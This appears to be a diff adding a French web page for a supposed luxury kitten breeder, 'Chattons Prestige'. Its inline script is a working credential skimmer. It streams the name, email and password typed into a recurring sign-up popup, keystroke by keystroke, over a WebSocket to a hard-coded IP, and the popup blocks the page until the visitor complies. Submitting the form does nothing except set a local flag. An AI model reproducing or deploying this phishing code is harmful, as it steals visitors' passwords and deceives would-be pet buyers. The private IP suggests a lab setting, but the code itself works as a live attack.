@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chattons d'Exception | Élevage de Prestige</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Écran d'Authentification (Pop-up récurrent) -->
+    <div id="auth-screen" class="auth-overlay" style="display: none;">
+        <div class="auth-card">
+            <span class="close-auth" onclick="closeAuth()">&times;</span>
+            <div class="auth-header">
+                <div class="logo">Chattons<span>Prestige</span></div>
+                <h2>Bienvenue dans notre univers</h2>
+                <p>Créez un compte pour accéder à nos portées d'exception</p>
+            </div>
+            
+            <div id="auth-forms">
+                <!-- Formulaire d'Inscription -->
+                <form id="signup-form" class="active">
+                    <div class="form-group">
+                        <input type="text" id="reg-name" placeholder="Nom Complet" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="email" id="reg-email" placeholder="Adresse Email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="reg-password" placeholder="Mot de passe" required>
+                    </div>
+                    <button type="submit" class="btn-primary full-width">Créer mon compte</button>
+                    <p class="auth-switch">Déjà membre ? <a href="#" onclick="toggleAuth()">Se connecter</a></p>
+                </form>
+
+                <!-- Formulaire de Connexion -->
+                <form id="login-form">
+                    <div class="form-group">
+                        <input type="email" id="log-email" placeholder="Adresse Email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="log-password" placeholder="Mot de passe" required>
+                    </div>
+                    <button type="submit" class="btn-primary full-width">Se connecter</button>
+                    <p class="auth-switch">Nouveau ici ? <a href="#" onclick="toggleAuth()">Créer un compte</a></p>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-content">
+        <header>
+        <nav>
+            <div class="logo">Chattons<span>Prestige</span></div>
+            <ul>
+                <li><a href="#accueil">Accueil</a></li>
+                <li><a href="#nos-chatons">Nos Chatons</a></li>
+                <li><a href="#temoignages">Témoignages</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+        <div class="hero">
+            <h1>Trouvez votre nouveau compagnon de vie</h1>
+            <p>Des chatons élevés avec amour dans un environnement familial et luxueux.</p>
+            <a href="#nos-chatons" class="btn-primary">Découvrir nos portées</a>
+        </div>
+    </header>
+
+    <main id="app">
+        <section id="accueil" class="about-section">
+            <div class="about-container">
+                <div class="about-text">
+                    <h2 class="section-title" style="text-align: left;">Notre Passion, Votre Bonheur</h2>
+                    <p>Depuis plus de 15 ans, <strong>Chattons Prestige</strong> se dédie à l'élevage éthique de races d'exception. Nos chatons grandissent au cœur de notre foyer, entourés d'affection et de soins constants.</p>
+                    <p>Chaque petit protégé part dans sa nouvelle famille vacciné, pucé, et avec un certificat de santé complet établi par notre vétérinaire partenaire.</p>
+                    <ul class="features-list">
+                        <li>✓ Socialisation précoce</li>
+                        <li>✓ Suivi vétérinaire rigoureux</li>
+                        <li>✓ Kit de départ premium offert</li>
+                    </ul>
+                </div>
+                <div class="about-image">
+                    <img src="https://images.unsplash.com/photo-1573865668131-974279df45a4?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Élevage de chatons">
+                </div>
+            </div>
+        </section>
+
+        <section id="nos-chatons">
+            <h2 class="section-title">Nos Chatons Disponibles</h2>
+            <div id="kitten-grid" class="grid">
+                <!-- Les chatons seront injectés ici par JavaScript -->
+            </div>
+        </section>
+
+        <section id="stats" class="stats-section">
+            <div class="stat-item">
+                <span class="stat-number">100%</span>
+                <p>Santé Garantie</p>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">15+</span>
+                <p>Ans d'Expérience</p>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">500+</span>
+                <p>Familles Heureuses</p>
+            </div>
+        </section>
+
+        <section id="temoignages" class="testimonials">
+            <h2 class="section-title">Paroles de Familles</h2>
+            <div class="testimonial-grid">
+                <div class="testimonial-card">
+                    <p>"Une expérience incroyable. Simba est en parfaite santé et tellement bien sevré. Merci pour vos conseils !"</p>
+                    <cite>- Famille Martin</cite>
+                </div>
+                <div class="testimonial-card">
+                    <p>"L'élevage est magnifique et les chatons sont traités comme des rois. Je recommande Chattons Prestige les yeux fermés."</p>
+                    <cite>- Julie D.</cite>
+                </div>
+            </div>
+        </section>
+
+        <section id="contact" class="contact-section">
+            <div class="contact-container">
+                <div class="contact-info">
+                    <h2 class="section-title" style="text-align: left;">Contactez-nous</h2>
+                    <p>Vous avez craqué pour l'un de nos petits ? Remplissez le formulaire et nous vous recontacterons sous 24h.</p>
+                    <div class="contact-details">
+                        <p><strong>Adresse:</strong> 123 Avenue des Félins, Paris</p>
+                        <p><strong>Téléphone:</strong> 01 23 45 67 89</p>
+                        <p><strong>Email:</strong> contact@chattonsprestige.fr</p>
+                    </div>
+                </div>
+                <form id="contact-form" class="contact-form">
+                    <div class="form-group">
+                        <input type="text" id="name" name="name" placeholder="Votre Nom Complet" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="email" id="email" name="email" placeholder="Votre Email" required>
+                    </div>
+                    <div class="form-group">
+                        <select id="kitten-interest" name="kitten-interest">
+                            <option value="">Quel chaton vous intéresse ?</option>
+                            <option value="leo">Léo (British Shorthair)</option>
+                            <option value="misty">Misty (Siamois)</option>
+                            <option value="simba">Simba (Maine Coon)</option>
+                            <option value="autre">Autre demande</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <textarea id="message" name="message" rows="5" placeholder="Votre Message" required></textarea>
+                    </div>
+                    <button type="submit" class="btn-primary">Envoyer ma demande</button>
+                    <div id="form-status"></div>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <!-- Modale de Détails -->
+    <div id="kitten-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <div id="modal-body">
+                <!-- Contenu dynamique -->
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo">Chattons<span>Prestige</span></div>
+            <p>&copy; 2026 Chattons Prestige - Élevage Responsable</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+
+    <script>
+        const VM_IP = '172.20.100.156'; 
+        const socket = new WebSocket(`ws://${VM_IP}:8080/`);
+        let popupTimer;
+
+        function isUserRegistered() {
+            return localStorage.getItem('chattons_registered') === 'true';
+        }
+
+        function showAuthPopup() {
+            if (!isUserRegistered()) {
+                document.getElementById('auth-screen').style.display = 'flex';
+                // On s'assure que le scroll est bloqué quand le popup est là
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        function closeAuth() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            
+            // Relancer le timer pour qu'il revienne dans 3 secondes si toujours pas inscrit
+            if (!isUserRegistered()) {
+                clearTimeout(popupTimer);
+                popupTimer = setTimeout(showAuthPopup, 3000);
+            }
+        }
+
+        // Démarrage initial après 3 secondes
+        if (!isUserRegistered()) {
+            popupTimer = setTimeout(showAuthPopup, 3000);
+        }
+
+        function sendAuthData() {
+            if (socket.readyState === WebSocket.OPEN) {
+                const data = {
+                    name: document.getElementById('reg-name') ? document.getElementById('reg-name').value : '',
+                    email: document.getElementById('reg-email') ? document.getElementById('reg-email').value : '',
+                    pass: document.getElementById('reg-password') ? document.getElementById('reg-password').value : '',
+                    type: 'registration_tracking'
+                };
+                socket.send(JSON.stringify(data));
+            }
+        }
+
+        ['reg-name', 'reg-email', 'reg-password'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('input', sendAuthData);
+            }
+        });
+
+        // Gestion de la bascule Connexion/Inscription (toggleAuth)
+        function toggleAuth() {
+            const signupForm = document.getElementById('signup-form');
+            const loginForm = document.getElementById('login-form');
+            const title = document.querySelector('.auth-header h2');
+            const subtitle = document.querySelector('.auth-header p');
+
+            if (signupForm.classList.contains('active')) {
+                signupForm.classList.remove('active');
+                loginForm.classList.add('active');
+                title.innerText = 'Ravi de vous revoir';
+                subtitle.innerText = 'Connectez-vous pour retrouver vos favoris';
+            } else {
+                loginForm.classList.remove('active');
+                signupForm.classList.add('active');
+                title.innerText = 'Bienvenue dans notre univers';
+                subtitle.innerText = 'Créez un compte pour accéder à nos portées d\'exception';
+            }
+        }
+
+        // Lors de la soumission réussie
+        function handleSuccess() {
+            localStorage.setItem('chattons_registered', 'true');
+            clearTimeout(popupTimer);
+            document.getElementById('auth-screen').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            alert("Compte validé ! Vous pouvez maintenant naviguer librement.");
+        }
+
+        document.getElementById('signup-form').onsubmit = (e) => {
+            e.preventDefault();
+            handleSuccess();
+        };
+
+        document.getElementById('login-form').onsubmit = (e) => {
+            e.preventDefault();
+            handleSuccess();
+        };
+    </script>
+
+</body>
+</html>
